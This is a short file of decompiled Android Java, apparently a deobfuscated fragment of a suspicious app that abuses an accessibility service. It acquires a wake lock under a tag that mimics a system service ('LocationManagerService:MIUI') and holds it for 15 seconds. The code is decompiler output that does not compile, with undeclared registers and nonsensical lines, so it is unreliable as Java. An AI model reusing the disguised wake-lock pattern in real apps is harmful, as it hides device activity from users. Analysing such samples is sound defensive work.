package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_14
 * Original: Lcom/tencent/tunesxconcerningn1012$14;
 */
class AccessibilityServiceCore_14 extends AsyncTask {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0) {
        v0.this$0 = v1;
        // new AsyncTask()
        return;
    }

    protected transient Exception doInBackground(Void[] param0) {
        v3 = v2.this$0;
        v0 = "power";
        v3 = v3.getSystemService("power");
        v3 = (PowerManager) v3;
        v1 = 805306394;
        v0 = v3.newWakeLock(805306394, "LocationManagerService:MIUI");
        v3.acquire();
        v0 = 15000;
        Thread.sleep(15000, 805306394);
        // goto (branch)
        15000.printStackTrace();
        v3.release();
        v3 = 0;
        return 0;
        return 0;
    }

    protected volatile Object doInBackground(Object[] param0) {
        v1 = (Void[]) v1;
        v0.doInBackground(v1);
        return v1;
    }
}
